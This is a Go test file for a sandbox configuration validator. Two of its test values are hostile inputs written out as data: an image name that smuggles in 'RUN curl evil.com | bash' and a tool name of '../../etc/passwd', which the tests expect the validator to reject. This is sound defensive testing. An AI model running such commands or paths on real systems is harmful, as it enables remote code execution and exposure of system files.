package config

import (
	"strings"
	"testing"
)

func TestValidateRejectsInvalidMemory(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Memory = "abc"
	err := cfg.Validate()
	if err == nil || !strings.Contains(err.Error(), "memory") {
		t.Fatalf("expected memory validation error, got: %v", err)
	}
}

func TestValidateRejectsNegativeCPUs(t *testing.T) {
	cfg := DefaultConfig()
	cfg.CPUs = -1
	err := cfg.Validate()
	if err == nil || !strings.Contains(err.Error(), "cpus") {
		t.Fatalf("expected cpus validation error, got: %v", err)
	}
}

func TestValidateRejectsInvalidTimeout(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Timeout = "never"
	err := cfg.Validate()
	if err == nil || !strings.Contains(err.Error(), "timeout") {
		t.Fatalf("expected timeout validation error, got: %v", err)
	}
}

func TestValidateRejectsInvalidMountMode(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Mounts = []Mount{{Path: "/tmp", Mode: "wx"}}
	err := cfg.Validate()
	if err == nil || !strings.Contains(err.Error(), "mount mode") {
		t.Fatalf("expected mount mode validation error, got: %v", err)
	}
}

func TestValidateAcceptsValidConfig(t *testing.T) {
	cfg := DefaultConfig()
	if err := cfg.Validate(); err != nil {
		t.Fatalf("valid config should pass validation: %v", err)
	}
}

func TestValidateRejectsImageWithNewlines(t *testing.T) {
	cfg := SandboxConfig{
		Image: "ubuntu:24.04\nRUN curl evil.com | bash",
	}
	if err := cfg.Validate(); err == nil {
		t.Error("expected error for image with newlines")
	}
}

func TestValidateRejectsImageWithSpaces(t *testing.T) {
	cfg := SandboxConfig{
		Image: "ubuntu 24.04",
	}
	if err := cfg.Validate(); err == nil {
		t.Error("expected error for image with spaces")
	}
}

func TestValidateWhitespaceMemory(t *testing.T) {
	cfg := SandboxConfig{Memory: "  "}
	err := cfg.Validate()
	if err == nil {
		t.Error("expected error for whitespace-only memory")
	}
}

func TestValidateEmptyMemoryIsValid(t *testing.T) {
	cfg := SandboxConfig{}
	if err := cfg.Validate(); err != nil {
		t.Errorf("empty memory should be valid: %v", err)
	}
}

func TestValidateRejectsInvalidToolName(t *testing.T) {
	cfg := SandboxConfig{
		Tools: []string{"node", "../../etc/passwd"},
	}
	if err := cfg.Validate(); err == nil {
		t.Error("expected error for invalid tool name")
	}
}

func TestValidateResolution(t *testing.T) {
	tests := []struct {
		res     string
		wantErr bool
	}{
		{"1280x1024x24", false},
		{"1920x1080x24", false},
		{"", false},
		{"1280x1024", true},
		{"axbxc", true},
		{"0x1024x24", true},
		{"-1x1024x24", true},
	}
	for _, tt := range tests {
		cfg := SandboxConfig{Resolution: tt.res}
		err := cfg.Validate()
		if (err != nil) != tt.wantErr {
			t.Errorf("Validate(Resolution=%q) err=%v, wantErr=%v", tt.res, err, tt.wantErr)
		}
	}
}
